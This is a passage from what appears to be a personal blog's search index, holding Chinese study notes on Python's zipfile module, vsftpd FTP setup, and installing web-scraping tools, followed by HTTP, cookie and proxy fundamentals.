0x40, 0x80, 0x1B, 0x36}]]></content>
      <tags>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python的zipfile模块]]></title>
    <url>%2F2020%2F03%2F25%2Fpython%E7%9A%84zipfile%E6%A8%A1%E5%9D%97%2F</url>
    <content type="text"><![CDATA[zipfile是python里用来做zip格式编码的压缩和解压缩的。有两个非常常用的class, 分别是ZipFile和ZipInfo, 在绝大多数的情况下，我们只需要使用这两个class就可以了。 ZipFile是主要的类，用来创建和读取zip文件而ZipInfo是存储的zip文件的每个文件的信息的。 ZipFile和Zipinfo这两个类的基本操作1class zipfile.ZipFile(file,mode,compression,allowZip64) 创建一个ZipFile对象，表示一个zip文件。参数file表示文件的路径,参数mode指示打开zip文件的模式，默认值为’r’，表示读已经存在的zip文件，也可以为’w’或’a’，’w’表示新建一个zip文档或覆盖一个已经存在的zip文档,’a’表示将数据附加到一个现存的zip文档中。参数compression表示在写zip文档时使用的压缩方法，它的值可以是zipfile. ZIP_STORED 或zipfile. ZIP_DEFLATED。如果要操作的zip文件大小超过2G，应该将allowZip64设置为True。 1ZipFile.getinfo(name) 获取zip文档内指定文件的信息。返回一个zipfile.ZipInfo对象，它包括文件的详细信息。 1ZipFile.infolist() 获取zip文档内所有文件的信息，返回一个zipfile.ZipInfo的列表。 1ZipFile.namelist() 获取zip文档内所有文件的名称列表。 1ZipFile.extract(member, path, pwd) 将zip文档内的指定文件解压到当前目录。参数member指定要解压的文件名称或对应的ZipInfo对象；参数path指定了解析文件保存的文件夹；参数pwd为解压密码。 1os.getcwd() 用于返回当前工作目录。 1os.path.join() 连接两个或更多的路径名组件。1.如果各组件名首字母不包含’/’，则函数会自动加上。2.如果有一个组件是一个绝对路径，则在它之前的所有组件均会被舍弃。3.如果最后一个组件为空，则生成的路径以一个’/’分隔符结尾。 1ZipFile.extractall(path, members, pwd) 解压zip文档中的所有文件到当前目录。参数members的默认值为zip文档内的所有文件名称列表，也可以自己设置，选择要解压的文件名称。 1ZipFile.printdir() 将zip文档内的信息打印到控制台上。 1ZipFile.setpassword(pwd) 设置zip文档的密码。 1ZipFile.read(name, pwd) 获取zip文档内指定文件的二进制数据。]]></content>
  </entry>
  <entry>
    <title><![CDATA[Docker]]></title>
    <url>%2F2020%2F03%2F24%2FDocker%2F</url>
    <content type="text"></content>
  </entry>
  <entry>
    <title><![CDATA[FTP配置]]></title>
    <url>%2F2020%2F03%2F21%2FFTP%E9%85%8D%E7%BD%AE%2F</url>
    <content type="text"><![CDATA[说起来有点搞笑，查到腾讯云的教程，看webshell的标准登陆方式，发现出来个二维码让我登录，愣了愣，想起来自己领的是阿里云。 Vsftpd即very secure FTP daemon，是众多Linux发行版本中默认的FTP服务器。安装步骤： 首先执行以下命令安装vsftpd。 1yum install -y vsftpd 设置vsftpd开机自启。 1systemctl enable vsftpd 启动FTP服务。 1systemctl start vsftpd 确认启动。 1netstat -antup | grep ftp 配置vsftpd。 12useradd namepasswd name后输入密码]]></content>
      <tags>
        <tag>FTP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[环境配置与爬虫基础]]></title>
    <url>%2F2020%2F03%2F17%2F%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0%E4%B9%8Bpython3%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB%E5%BC%80%E5%8F%91%E5%AE%9E%E6%88%98%2F</url>
    <content type="text"><![CDATA[[TOC] 第一章：环境配置Python3的安装推荐了Anaconda，注意环境变量配置。 作者推荐解决版本冲突问题的方法：将安装目录中的python.exe复制一份，命名为python3.exe，能够更好地区分python版本。 请求库的安装爬虫可以简单分为几步：抓取页面，分析页面和存储数据。在抓取页面的过程中，我们需要模拟浏览器向服务器发出请求，所以需要python库来实现HTTP请求操作。 requests的安装 分为pip+库名安装，wheel（原来后缀为.whl是这个意思，安装好wheel库后直接用pip3命令+文件名）安装与源码安装（这个没听过，cd requests，python3 setup.py install）。 2.Selenium的安装 Selenium是一个自动化测试工具，利用它可以驱使浏览器执行特定动作，如点击/下拉。对于JS渲染的页面非常有效。 安装方式同上，但还需要配置浏览器来配合其工作。 ChromeDriver安装安装ChromeDriver能够驱动Chrome完成相应的操作。注意在Chrome中输入chrome://version/查看版本，不同版本的Chrome与ChromeDriver不适配。 下载完后将ChromeDriver.exe放到Chrome安装的文件夹并配置环境变量（用户变量）。 1234567命令行配置环境变量的快捷方式：export PATH=&quot;$PATH:复制的路径&quot;保存后执行如下命令：source ~/.profile测试：from selenium import webdriverbrowser = webdriver.Chrome() 此处在cmd中执行该命令报错没有selenium这个模块，百度得知是selenium不能通过pip install安装，要到官网下载然后在解压路径下执行python setup.py install.就是第三种源码安装。这回总算没报错，算是每种方法都尝试过了。 aiohttp的安装requests库是一个阻塞式HTTP请求库，当我们发出一个请求后，程序会一直等待服务器响应，直到得到响应后才会进行下一步处理。这个过程很耗时间。如果程序可以在这个等待过程中做一些其他事情，则会大大提高爬取效率。aiohttp就是这样提供异步web服务的库，从python3.5开始加入了async/await关键字，使得回调的写法更加直观与人性化。aiohttp借助于async/await。 123pip install aiohttppip install cchardet aiodns lxml的安装lxml是python的解析库，支持HTML和XML解析，支持XPath解析方式。 如果没有任何报错，则证明安装成功。如果出现报锚，比如提示缺少libxml2库等信息，可以采用wheel方式安装。推荐直接到这里（链接为：http://www.lfd.uci.edu/-goblke/pythonlibs/#lxml）下载对应的wheel文件，找到本地安装Python版本和系统对应的lxml版本，例如Windows64位、Python3.6，就选作lxml-3 .8.0-cp36-cp36m-win _ amd64. whl，将其下载到本地。然后pip。 Beauitful Soup安装Beauitful Soup是python的一个HTML或XML解析库，我们可以用它方便地从网页中提取数据，它拥有强大的API与多样的解析方式。 版本管理真是个奇妙的事情，好好用conda（为啥镜像源还会报错） ，以及pip与pip3，pycharm里安装了bs4，cmd中安装了beautifulsoup4，但是import的时候还是报错，就很难过。看了挺多中文办法，不得行。还是stack overflow上讲的明白： 123ou have the module installed for Python 2.7, however you&apos;re using and trying to import it with Python 3.6.You have to use pip3 like you use python3. 注意这里我们虽然安装的是beautifulsoup4这个包，但是在引入的时候却是bs4，因为这个包源代码本身的库文件夹的名称就是bs4.所以安装完成之后，这个库文件夹就被移入到本机python3的lib库里，所以识别到的库文件名就是bs4. pyquery的安装强大的网页解析工具，提供了和jQuery类似的语法来解析HTML文档，支持CSS选择器。 tesserocr安装爬虫过程中难免会遇到各种各样验证码，并且还是图形验证码，此时可以用OCR来识别。 OCR，即Optical Character Recognition，光学字符识别，指通过扫描字符，然后通过其形状将其翻译成电子文本的过程。tesserocr是Python的一个OCR识别库，实际上是对tesseract做的一层python API封装，所以在安装前者前要安装后者。下载tesseract，记住勾选Additional language data来安装OCR识别支持的语言包。 安装完后注意要配置环境变量，现在终于知道环境变量是用来干嘛的了，是为了在使用命令行的时候能够直接使用某种命令，如python，tesseract。 在系统环境变量中，Path添加tesseract的安装目录。在系统环境变量中，添加变量“TESSDATA_PREFIX”，变量值为tessdata文件夹所在路径。注意系统要重启。 命令： tesseract [xxx.jpg/png/etc] [result.txt|stdout] [-l eng | chi_sim] 如果要输入文字到result.txt中，需要以管理员身份运行cmd。指定字库的时候，只需要字库的前缀。eng.traineddata，只输入并且只能输入eng。 tesseract命令第一个参数为图片名称，第二个参数result为结果保存的目标文件名，-l指定使用的语言包，eng即英文。 验证安装： 123456from PIL import Imageimport pytesseract text = pytesseract.image_to_string(Image.open(r&apos;D:\My Tools\image.png&apos;))print(text)//Image.open读取了图片文件，然后调用pytesseract的image_to_string方法。 数据库的安装：作为数据存储的重要部分，数据库必不可少，可以分为关系型数据库和非关系型数据库，前者数据库以表的形式存储，后哦这存储形式为键值对，更加灵活。MySQL是一个轻量级的关系数据库，MongoDB使用C++编写的非关系型数据库，是一个基于分布式文件存储的开源数据库系统（啥意思），其存储方式类似JSON对象，字段值可以包含其他文档，数组以及文档数组。 可视化工具：RoboMongo/Robo 3T，Studio 3T。 安装了Redis，Host没找对，直接输入local就行，结果搞了很久。看起来一直在努力找资料，实际上太懒了根本没动脑子。 存储库的安装：PyMySQL/PyMongo/redis-py（用于与redis交互） RedisDump安装：他是一个用于Redis数据导入导出的工具，基于Ruby实现。 安装Ruby后就可执行gem命令，类似于pip。 1gem install redis-dump 验证安装 12redis-dumpredis-load Web库的安装：Flask，Django这样的一些web服务程序是基于python开发的，我们可以拿他来开发网站和接口。目前主要使用这些web服务程序来搭建一些API接口供爬虫使用。 API:Application Programming Interface，应用程序接口，是一些预先定义的函数，或者说软件系统不同组成部分衔接的约定。 目的是提供应用程序与开发人员基于某软件或硬件得以访问一组例程的能力，而又无需访问原码，或理解内部工作机制的细节。 Flask安装Flask是一个轻量级的web服务程序，此处主要用来做一些API服务。 1pip3 install flask 验证安装总没法成功，再找找原因。 验证的脚本出错了，问题在于最后一段。 123456789101112131415#!/usr/bin/env python # -*- coding:utf-8 -*-#导入了Flask类from flask import Flask#创建一个该类的实例app = Flask(__name__)#route装饰器告诉告诉Flask什么样的URL能够触发函数@app.route(&apos;/&apos;)#这个函数的名字也在生成 URL 时被特定的函数采用，这个函数返回我们想要显示在用户#浏览器中的信息。def hello_world(): return &apos;Hello World!&apos;#最后我们用 run() 函数来让应用运行在本地服务器上。 其中 if __name__ #==&apos;__main__&apos;: 确保服务器只会在该脚本被 Python 解释器直接执行的时候才会运行，而不是作为模块导入的时候。if __name__ == &apos;__main__&apos;: app.run() 后面将利用Flask+Redis维护动态代理池和Cookie池。 Tornado安装Tornado是一个支持异步的Web框架，通过使用非阻塞I/O流，支持上千万的开放连接。 pip3安装，后面将利用Tornado+redis来搭建一个ADSL拨号代理池。 APP爬取相关库的安装：除了Web网页，爬虫也可以抓取APP数据。APP中页面加载所需要的数据通过请求服务器的接口获取。由于APP没有浏览器这种直观看到后台请求的数据，所以主要使用一些抓包工具来抓取数据。一些简单的接口可以使用Charles或者mitmproxy分析，找出规律，然后直接利用程序模拟来抓取。更复杂的接口利用mitmdump，对抓取到的请求进行实时处理与保存。自动化APP工具：Appium，可以像selenium一样对App进行自动化控制，模拟点击等操作。 Cherles的安装Charles是一个网络抓包工具，这里主要选用为移动端抓包工具。 证书配置：现在很多页面都在向HTTPS发展，如果一个App通信应用了HTTPS协议，那么它的通信数据是会被加密的，常规的抓包方法无法识别请求的内部数据。如果要做HTTPS抓包的话，需要配置相关的SSL证书。Help&gt;SSL Proxying&gt;install Charles Root Certificate,将所有的证书放入下列存储，然后浏览选择受信任的根证书颁发机构。 使用Charles代理手机请求：找WLAN的设定就找了很久，长按修改，进阶模式。但是设置好代理之后一直连接不上网络，监听不了，是啥原因？等到后面实战移动端的时候再肝一下。 mitmproxy的安装暂时不用 Appium的安装Appium负责驱动移动端来完成一系列操作，对于Android来说，它使用UIAutomator和Selendroid来实现驱动。Android开发环境配置，之后再看。Android SDK与Android Studio 爬虫框架的安装：我们直接用requests,Selenium等库写爬虫，如果爬取量不是太大，速度要求不高，完全可以满足需求。但是写多了就会发现其内部许多代码与组件是完全可以复用的。把这些组件抽离出来，将各个功能模块化，就会形成爬虫框架。 pyspider的安装安装完报错，讲到时再试。 12345678910111213Traceback (most recent call last): File &quot;C:\Users\Lenovo\AppData\Local\Programs\Python\Python37\Scripts\pyspider-script.py&quot;, line 11, in &lt;module&gt; load_entry_point(&apos;pyspider==0.3.10&apos;, &apos;console_scripts&apos;, &apos;pyspider&apos;)() File &quot;c:\users\lenovo\appdata\local\programs\python\python37\lib\site-packages\pkg_resources\__init__.py&quot;, line 489, in load_entry_point return get_distribution(dist).load_entry_point(group, name) File &quot;c:\users\lenovo\appdata\local\programs\python\python37\lib\site-packages\pkg_resources\__init__.py&quot;, line 2793, in load_entry_point return ep.load() File &quot;c:\users\lenovo\appdata\local\programs\python\python37\lib\site-packages\pkg_resources\__init__.py&quot;, line 2411, in load return self.resolve() File &quot;c:\users\lenovo\appdata\local\programs\python\python37\lib\site-packages\pkg_resources\__init__.py&quot;, line 2417, in resolve module = __import__(self.module_name, fromlist=[&apos;__name__&apos;], level=0) File &quot;c:\users\lenovo\appdata\local\programs\python\python37\lib\site-packages\pyspider\run.py&quot;, line 231 async=True, get_object=False, no_input=False): Scrapy的安装连上V2ray和不连v2ray，在用镜像源安装的时候差别居然这么大。注意安装好各种前置的库。 Scrapy-Splash的安装需要Docker Scrapy-Redis的安装1pip3 install scrapy-redis 部署相关库的安装：如果想要大规模抓取数据，那么一定会用到分布式爬虫。对于分布式爬虫，需要多台主机，每台主机上有多个爬虫任务，但只有一份源代码。此时需要做的就是将一份代码同时部署到多台主机上来运行。 对于Scrapy，名为Scrapyd的扩展组件能够帮助我们远程管理Scrapy任务，包括部署源码，启动任务，监听任务等等。Scrapy-Client和Scrapyd API非常实用。 或者利用Docker集群部署，只需要将爬虫只作为Docker镜像。只要主机中安装了Docker，就能够直接运行爬虫，无需担心环境与版本问题。 Docker的安装hyper-v，谜之报错，安装完发现不需要，不需要也就算了还不共存，不共存也就算了还不能删。 可能是要安装docker for Windows？可不是说只支持专业版，这样一说要修改注册表？ 修改了注册表，但是依旧报错。 老子不装了，等到后面学分布式爬虫再说。注意不能学啥都学的太浅薄，不然根本没有用。 Scrapyd的安装需要linux环境，后面有需要再看。 Scrapyd-Client的安装基于Scrapyd Scrapyd API安装基于Scrapyd Scrapyrt的安装Scrapyrt为Scrapy提供了一个调度的HTTP接口，有了它我们可以通过请求一个HTTP接口来调度Scrapy任务。Scarpyrt比Scrapyd更轻量，如果不需要分布式多任务，可简单实用Scarpyrt实现远程Scrapy任务调度。 Gerapy的安装1pip3 install gerapy 第二章：爬虫基础HTTP基本原理URI与URLURI：Uniform Resource Identifier，统一资源标识符。URL：Universal Resource Locator，统一资源定位符。URL是URI的真子集，URI还包括一个子集叫做URN：Universal Resource Name，统一资源名称。URN只命名资源而不定位资源。如URN:isbn：xxxx指定了一本书的ISBN，能够唯一标识这本书，但是没有定位。 URL一定能够定位但可能没有名称，URN一定有名称但可能不能定位。 超文本hypertext浏览器中看到的网页就是一系列HTML代码（超文本）解析而成，最后呈现出来并不以代码本身，而是标识出的别的形式。 HTTP与HTTPS两者都是访问资源需要的协议类型，有时还会看到ftp，sftp，smb开头的URL，它们都是协议类型。在爬虫中一般抓取的是HTTP与HTTPS协议的。 HTTP：Hyper Text Transfer Protocol，超文本传输协议。HTTP协议用于从网络传输超文本数据到本地浏览器的传输协议。目前广泛使用的是HTTP1.1版本。 HTTPS的全称是Hyper Text Transfer Protocol over Secure Socket Layer，是在HTTP下加入SSL层，HTTP的安全版。 HTPPS的安全基础是SSL，因此通过它传输的内容都是经过SSL加密的，主要有两种作用： 建立一个信息安全通道来保证数据的安全。 确认网站的真实性：凡是使用了HTTPS的网站，都可以通过点击浏览器的锁头标志来查看网站认证之后的真实信息。也可以通过CA机构颁发的安全签章来查询。 某些网站虽然使用了HTTPS协议，但是还是被浏览器提示不安全，这是因为其CA证书是自行签发而不被CA机构所信任，但实际上仍然是经过SSL加密的。如果要爬取这样的站点，就要忽略证书的选项，否则会提示SSL链接错误。 HTTP请求过程访问网站的过程实际上是在浏览器中输入一个URL后，浏览器向网站所在的服务器发送一个请求，网站服务器接收到这个请求后进行处理与解析，然后返回对应的响应，接着传回给浏览器。这个”响应”里包含了页面的源代码等内容，浏览器对其进行解析后便呈现了出来。 打开Chrome浏览器，右键选择“检查”，Network监听组件能够直观地现实访问当前请求网页时所发生的所有网络请求和响应。其中各列表示的意思如下： Name：请求的名称，一般会将URL的最后一部分内容当作名称。 Status：响应的状态码，通过状态码我们可以判断发送了请求之后是否得到了正常的响应。 Type：请求的文档类型，有jpeg，png，stylesheet，document等。 Initiator：请求源，用于标记请求是由哪个对象或者进程发起的。 Size：从服务器下载的文件和请求资源的大小。如果是从缓存中取得的资源，则该列会显示from cache。 Time：发起请求到获取响应所用的总时间。 Waterfall：网络请求的可视化瀑布流。 请求由客户端向服务端发出，分为请求方法，请求网址，请求头与请求体。 请求方法：常见的请求方法有GET与POST。GET：在浏览器中输入URL并回车，便发起了一个URL请求，请求的参数会直接包含到URL中，比如https://www.baidu.com/s?wd=python,参数wd就表示要搜索的关键字。POST请求大多在表单提交时发起，用于提交数据等，其数据以表单的形式传输，而不会体现在URL中。 二者区别：GET请求的参数包含在URL中，数据能够直接看到。而POST的数据会包含在请求体中，URL中看不到。GET请求提交的数据最多只有1024字节，而POST无限制。一般来说传递敏感信息与发送较大文件，都用POST请求。 1 GET 请求指定的页面信息，并返回实体主体。 2 HEAD 类似于 GET 请求，只不过返回的响应中没有具体的内容，用于获取报头 3 POST 向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。数据被包含在请求体中。POST 请求可能会导致新的资源的建立和/或已有资源的修改。 4 PUT 从客户端向服务器传送的数据取代指定的文档的内容。 5 DELETE 请求服务器删除指定的页面。 6 CONNECT HTTP/1.1 协议中预留给能够将连接改为管道方式的代理服务器。 7 OPTIONS 允许客户端查看服务器的性能。 8 TRACE 回显服务器收到的请求，主要用于测试或诊断。 9 PATCH 是对 PUT 方法的补充，用来对已知资源进行局部更新 。 请求网址：URL，能够确定请求的资源。 请求头：用于说明服务器要使用的附加信息，如Cookie，Referer，User-Agent 常用的头信息： Accept：请求报头域，用于指定客户端可以接受哪些类型的信息。 Host：用于指定请求资源的主机IP和端口号，其内容为URL的原始服务器/网关的位置。从HTTP1.1开始，请求必须包含此内容。 Cookie：网站为了辨别用户进行会话跟踪而存储在用户本地的数据。主要功能是维持当前会话，即使再次刷新也能够无需再次输入信息。Cookies里有信息标识了对应服务器的会话，每次浏览器在请求该站点页面时，都会在请求头中加入Cookies并将其发送给服务器。服务器通过Cookies识别出身份，直接返回登陆后的页面。 Referer：用于标识这个请求的来源，服务器可以拿到此信息做相应处理。 User-Agent：UA，特殊的字符串头，可以使服务器识别客户使用的操作系统（版本）/浏览器(版本)。在做爬虫时加上此信息，可以伪装成浏览器，否则很可能被识别为爬虫。 Content-Type：互联网媒体类型，MIME类型。它用于表示具体请求中的媒体类型信息： text/html代表HTML格式(XML数据)。image/gif代表GIF图片。application/json代表JSON类型。只有设置Content-Type为application/x-www-form-urlencoded，才会以表单数据形式提交。appilcation/json来提交(序列化)JSON数据。multipart/form-data来上传(表单)文件。blabla。 在爬虫中，如果要构造POST请求，需要使用正确的Content-Type，并了解各种请求库的各个参数设置时使用的是哪种Type，不然会导致POST提交后无法正常响应。 请求体：请求体一般承载的内容是POST请求中的表单数据，相对于GET请求，请求体为空。 响应：由服务端返回给客户端，可以分成响应状态码Request Status Code，响应头Response Headers和响应体Response Body。 响应状态码：表示服务器的响应状态，在爬虫中我们根据状态码来判断响应状态。 1** 信息，服务器收到请求，需要请求者继续执行操作 2** 成功，操作被成功接收并处理 3** 重定向，需要进一步的操作以完成请求 4** 客户端错误，请求包含语法错误或无法完成请求 5** 服务器错误，服务器在处理请求的过程中发生了错误 100 Continue 继续。客户端应继续其请求 101 Switching Protocols 切换协议。服务器根据客户端的请求切换协议。只能切换到更高级的协议，例如，切换到HTTP的新版本协议 200 OK 请求成功。一般用于GET与POST请求 201 Created 已创建。成功请求并创建了新的资源 202 Accepted 已接受。已经接受请求，但未处理完成 203 Non-Authoritative Information 非授权信息。请求成功。但返回的meta信息不在原始的服务器，而是一个副本 204 No Content 无内容。服务器成功处理，但未返回内容。在未更新网页的情况下，可确保浏览器继续显示当前文档 205 Reset Content 重置内容。服务器处理成功，用户终端（例如：浏览器）应重置文档视图。可通过此返回码清除浏览器的表单域 206 Partial Content 部分内容。服务器成功处理了部分GET请求 300 Multiple Choices 多种选择。请求的资源可包括多个位置，相应可返回一个资源特征与地址的列表用于用户终端（例如：浏览器）选择 301 Moved Permanently 永久移动。请求的资源已被永久的移动到新URI，返回信息会包括新的URI，浏览器会自动定向到新URI。今后任何新的请求都应使用新的URI代替 302 Found 临时移动。与301类似。但资源只是临时被移动。客户端应继续使用原有URI 303 See Other 查看其它地址。与301类似。使用GET和POST请求查看 304 Not Modified 未修改。所请求的资源未修改，服务器返回此状态码时，不会返回任何资源。客户端通常会缓存访问过的资源，通过提供一个头信息指出客户端希望只返回在指定日期之后修改的资源 305 Use Proxy 使用代理。所请求的资源必须通过代理访问 306 Unused 已经被废弃的HTTP状态码 307 Temporary Redirect 临时重定向。与302类似。使用GET请求重定向 400 Bad Request 客户端请求的语法错误，服务器无法理解 401 Unauthorized 请求要求用户的身份认证 402 Payment Required 保留，将来使用 403 Forbidden 服务器理解请求客户端的请求，但是拒绝执行此请求 404 Not Found 服务器无法根据客户端的请求找到资源（网页）。通过此代码，网站设计人员可设置”您所请求的资源无法找到”的个性页面 405 Method Not Allowed 客户端请求中的方法被禁止 406 Not Acceptable 服务器无法根据客户端请求的内容特性完成请求 407 Proxy Authentication Required 请求要求代理的身份认证，与401类似，但请求者应当使用代理进行授权 408 Request Time-out 服务器等待客户端发送的请求时间过长，超时 409 Conflict 服务器完成客户端的 PUT 请求时可能返回此代码，服务器处理请求时发生了冲突 410 Gone 客户端请求的资源已经不存在。410不同于404，如果资源以前有现在被永久删除了可使用410代码，网站设计人员可通过301代码指定资源的新位置 411 Length Required 服务器无法处理客户端发送的不带Content-Length的请求信息 412 Precondition Failed 客户端请求信息的先决条件错误 413 Request Entity Too Large 由于请求的实体过大，服务器无法处理，因此拒绝请求。为防止客户端的连续请求，服务器可能会关闭连接。如果只是服务器暂时无法处理，则会包含一个Retry-After的响应信息 414 Request-URI Too Large 请求的URI过长（URI通常为网址），服务器无法处理 415 Unsupported Media Type 服务器无法处理请求附带的媒体格式 416 Requested range not satisfiable 客户端请求的范围无效 417 Expectation Failed 服务器无法满足Expect的请求头信息 500 Internal Server Error 服务器内部错误，无法完成请求 501 Not Implemented 服务器不支持请求的功能，无法完成请求 502 Bad Gateway 作为网关或者代理工作的服务器尝试执行请求时，从远程服务器接收到了一个无效的响应 503 Service Unavailable 由于超载或系统维护，服务器暂时的无法处理客户端的请求。延时的长度可包含在服务器的Retry-After头信息中 504 Gateway Time-out 充当网关或代理的服务器，未及时从远端服务器获取请求 505 HTTP Version not supported 服务器不支持请求的HTTP协议的版本，无法完成处理 响应头：包含服务器对请求的应答信息： Date:响应标识产生的时间 Last-Modified：指定资源的最后修改时间。 Content-Encoding：指定响应内容的编码。 Server：包含服务器的信息，名称，版本号等。 Content-Type:返回的文档类型。 Set-Cookie：设置Cookies。响应头中的Set-Cookie告诉浏览器需要将此内容放在Cookies中，下次请求携带Cookies请求。 Expires:指定响应的过期时间，可以使代理服务器或浏览器将加载的内容更新到缓存中。如果再次访问，就可以直接从缓存中加载，以降低服务器负载，缩短加载时间。 响应体：响应的正文数据都在响应体中，例如请求网页时，其响应体就是王爷的HTML代码。请求图片时便是图片的二进制数据。做爬虫请求网页后要解析的内容就是响应体。 网页基础基本组成，结构和节点等内容。 网页的组成：HTML.CSS.JavaScript，HTML相当于骨架，CSS相当于皮肤，JavaScript相当于肌肉。 HTML：由于学校课程学过比较熟悉，它是用来描述网页的一种超文本标记语言。不同类型的文字通过不同类型的标签来表示，如img，p等标签。他们之间的布局又常通过布局标签div嵌套组合而成，各种标签通过不同的排列和嵌套形成网页的框架。 CSS：只有HTML的页面布局并不美观，CSS全称Cascading Style Sheets,即层叠样式表。层叠是指当在HTML中引用了数个样式文件，并且样式发生冲突时，浏览器能够依据层叠顺序处理。样式指网页中文字大小，颜色，元素间距排列等格式。 1234567891011//大括号前是一个CSS选择器，意思是选择id为head_wrpper且class为s-ps-lite的节点，然后再选中其内部的class为s-p-top的节点。大括号内部写的是样式规则。#head_wrapper.s-ps-islite,s-p-top&#123;//position指定了这个元素的布局方式为绝对布局 position:absolute;//bottom指定元素的下边距为40px bottom:40px;//width指定了宽度为100%占满父元素 width:100%;//height指定元素的高度 height:181px;&#125; 在网页中，一般会统一定义整个网页的CSS样式规则，并写入CSS文件中（后缀为css）。在HTML中只要用link标签就能够引入写好的css文件。 JavaScript:是一种脚本语言，HTML与CSS配合使用，提供给用户的只是一种静态的信息缺乏交互，这要靠JS实现。JS通常也是以单独的文件加载的，后缀为js，通过在HTML标签引用。 网页的结构：title标签定义标题，会显示在网页的选项卡中，而不会显示在正文。body标签是网页正文中显示的内容，div标签定义了网页中的区块，它的id是container，属于非常常用属性，并且id的内容在网页中是唯一的，便于定位。class=wrapper的div标签，经常与CSS配合使用来设定样式。每个标签元素都有自己的class属性。 节点树以及节点之间的关系：在THML中，所有标签的定义都是节点，它们构成了一个HTML DOM树。DOM全称Document Object Model，文档对象模型。定义了访问HTML与XML的文档标准。W3C文档对象模型DOM是中立于平台和语言的接口，它允许程序和脚本动态地访问和更新文档的内容，结构与样式。 W3C标准被分为3个不同的部分： 核心DOM：针对任何结构化文档的标准模型 XML DOM：针对XML文档的标准模型 HTML DOM：针对HTML文档的标准模型 根据W3C的HTML DOM标准，HTML文档中的所有内容都是节点。 整个文档是一个文档节点。 每个HTML元素是一个元素节点 HTML元素内的文本是文本节点。 每个HTML属性是属性节点。 注释是注释节点。 通过HTML DOM，树中的所有节点均可通过JavaScript访问，所有HTML节点元素均可被修改,也可以被创立和删除。节点树中的节点彼此拥有层级关系，通常通过父，子，兄弟来描述这些关系。在节点树中，顶端节点通常称为根 选择器： 分为派生选择器，通过依据元素在其位置的上下文关系来定义样式，派生选择器允许你根据文档的上下文关系来确定某个标签的样式。通过合理地使用派生选择器，我们可以使 HTML 代码变得更加整洁。id选择器，可以为标有特定id的HTML元素指定特定样式，以一个#号表示。类选择器，以一个点号表示。属性选择器，可以为拥有指定属性的 HTML 元素设置样式，而不仅限于 class 和 id 属性。 爬虫的基本原理：简单来说，爬虫就是获取网页并提取和保存信息的自动化程序。 获取网页：首要工作便是获取网页的源代码，因为源代码包含网页的所有信息。向网站发送一个请求，返回的响应体便是网页源代码，所以最关键的便是构造请求，然后接收到响应并将其解析出来。python提供了许多库来实现这个操作，请求和响应都可以用类库提供的数据结构表示。得到响应之后我们只需要解析数据结构中的Body部分即可。 提取信息：分析网页源代码最通用的方式是正则表达式。还有一些根据网页节点属性，CSS选择器或者Xpath提取网页信息的库。 保存数据：可以简单保存为txt/json，或者保存到数据库，或者远程服务器。 自动化程序：在抓取过程中进行各种异常处理，错误重试等操作。 除了网页源代码之外，还有些网页返回的不是HTML代码，而是JSON字符串（API接口大多如此），这样的数据方便传输与解析。还有各种二进制数据，如图片音频。以及各种扩展名的文件，只要能在浏览器访问到都可以抓取。 JS渲染页面：有时候在urllib或者requests抓取页面时，得到的源代码与实际看到的不一样，这是因为现在网页越来越多地采用Ajax，前端模块化工具构建，如果整个页面都是JS渲染出来的（只要在最后加上即可完成页面渲染(渲染：构建渲染树，对各个元素进行位置计算、样式计算等等，然后根据渲染树对页面进行渲染（可以理解为“画”元素）)，就会得到一个HTML骨架。 在浏览器里打开这个页面时，首先加载这个HTML内容，然后浏览器会发现其中引入了一个app.js文件，接着请求这个文件，获得该文件后执行其中的JS代码改变HTML节点进行渲染。但是在用urllib/requests时不会帮我们继续加载这个JS文件。 对于这种情况，可以分析其后台Ajax接口，也可使用Selenium/Splash实现模拟JS渲染。 会话和Cookies最基本的HTML代码，将他放在某台具有固定公网IP的主机上，主机上装上Apache/Nginx服务器，这样这台主机就可以作为服务器，建立一个站点。这只是简单的静态网页无法实现交互。 无状态HTTP：HTTP的无状态指HTTP协议对事物处理无记忆能力。单纯的一次HTTP请求完成过后，服务器不会记录前后状态的变化，不知道客户端的状态。这意味着如果后续需要处理前面的信息，则必须重传。保持前后状态一致的技术就是会话和Cookies。会话位于服务端，即网站服务器，用来保存用户的会话信息。Cookies位于客户端(浏览器端)，有了Cookies服务器在下次访问网页时会自动将其附加发送给服务器。鉴定出是哪个用户，是否为登录状态，返回对应的页面。 因此在爬虫中，处理需要登录才能访问的页面时，一般将登录成功后获取的Cookies放在请求头里直接请求。 会话：会话对象用来存储特定用户绘画所需的属性以及配置信息。这样当用户在应用程序的web页面之间跳转的时候，存储在会话之间的变量不会消失，会在整个用户会话中一致存在下去。 Cookies：网站为了辨识用户身份，进行会话跟踪而存储在本地终端上的数据。 会话维持：当客户端第一次请求服务器时，服务器会返回一个请求头里带有Set-Cookie字段的响应给客户端，用于标识用户，客户端浏览器会把Cookies保存起来。下一次一起提交。 属性结构：Cookies详解 开发者工具>Application>Storage>Cookies Name：该Cookies的名称，一旦创建不可更改。 Value：该Cookies的值，如果为Unicode则为字符编码。如果为二进制数据BASE64编码。 Domain：可以访问该Cookies的域名，如果设置为.zhihu.com结尾的域名都可以访问该Cookie。 Max Age：该Cookie失效的时间，单位为s，与Expires一起使用。为正数在Max Age秒后失效，为负数关闭浏览器即失效。 Path：该Cookie的使用路径，设置为/则该域名下所有页面都可以访问该Cookie。 Size：Cookie大小。 HTTP字段：Cookie的httponly属性，如果为true则只有在HTTP头中会带有此Cookie信息，而不能通过document.cookie来访问此Cookie。 Secure：该Cookie是否仅被使用安全协议传输。安全协议：SSL，HTTPS。 会话Cookie与持久Cookie，前者把Cookie放在浏览器内存里，后者把Cookie存放到客户端硬盘中。(严格意义来说只是Max Age的大小问题。)除非程序通知服务器删除一个会话，否则服务器会一直保留。这就需要服务器为会话设置一个失效时间。 代理的基本原理：403 Forbidden>IP 访问频率太高>反爬虫措施>使用代理 基本原理：proxy server，代理网络用户去取得网络信息，通过中转站传递向服务器的请求与响应，这样服务器识别出的IP就不再是本机IP。 代理作用: 突破自身IP访问限制，访问不能访问的站点。 访问内网中的资源。 提高访问速度：通常代理服务器都设置一个较大的硬盘缓冲区，外界信息通过时会被保留在缓冲区，别的用户访问相同信息则直接从缓冲区取，提高访问速度。 隐藏真实IP，免受攻击。 代理分类：根据协议区分/根据匿名程度区分： 